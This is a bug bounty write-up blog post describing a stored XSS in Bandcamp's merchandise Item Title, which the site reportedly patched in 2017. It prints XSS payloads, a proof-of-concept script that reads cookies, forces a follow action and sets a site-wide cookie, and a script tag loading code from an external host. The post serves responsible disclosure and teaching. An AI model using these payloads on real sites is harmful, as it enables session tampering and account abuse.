---
layout: post
title: "Stored XSS in BandCamp"
author: Corben Leo
---
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Recently, while my friend <a href="https://twitter.com/Alyssa_Herrera_" rel="noopener noreferrer" style="color:#DC0739;text-decoration:none;"><b>Alyssa Herrera</b></a> and I were collaborating on finding ffmpeg vulnerabilities in bug bounty programs, we came to learn that **Bandcamp** ran a bug bounty program. If you have never heard of BandCamp, it is essentially a platform that allows artists, fans, and labels to interact, connect, and support each other.

I instantly was curious to see what I could find, so I signed up for an artist account and created a Bandcamp page. The first function I started to test was the **Add Music** function. This part of the site allows artists to add albums and tracks. I tested for IDOR and XSS, but sadly it wasn't vulnerable to either.

The next function I thought I wanted to test was the **Add Merch** function. There were 2 main parameters in this function that I wanted to test for XSS in immediately. I wanted to see if either the *Item Title* or *Description* accepted / rendered any HTML.
I put in a simple XSS payload for both:  `<svg/onload=confirm(0)>`

I saved and published the new "merchandise", and voila:
NOTHING happened. It was sanitized and I was bummed that it didn't work.
Then I saw the **Buy Now** button, so I clicked it, which opened a new frame and my XSS fired! They were not correctly sanitizing the **Item Title** in this frame, thus allowing an attacker to simply insert any HTML or javascript.

I am always reluctant in submitting an XSS with merely alert() because it just shows I was too lazy to actually come up with a cool proof-of-concept.
With that in mind, I came up with this POC:
```javascript
alert("Stored XSS on BandCamp");
alert("Your cookies: " + document.cookie);
document.getElementById("follow-unfollow").click();alert("Thanks for the follow :^D");
document.cookie="hacker=cdl;path=/;domain=.bandcamp.com";  
```
Then changed the **Item Title** to `<script src=//C0RB3N.pro/bandcamp.js></script>`
which made the victim follow me and set the cookie "hacker" to "cdl" for bandcamp.com and all subdomains in their browser!
<br>Proof of concept video:
<iframe src="https://player.vimeo.com/video/224109910" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
<br>
<h2><u>Timeline</u></h2>
- (6/29/2017) Reported XSS to Bandcamp via Email
- (6/30/2017) Confirmed, Patched, & Awarded with a $500 bounty!  

<br>
Thanks for reading,<br><br>
**Corben Leo**
- <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
- <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
- <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
- <a class="link" href="https://github.com/C0RB3N"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>

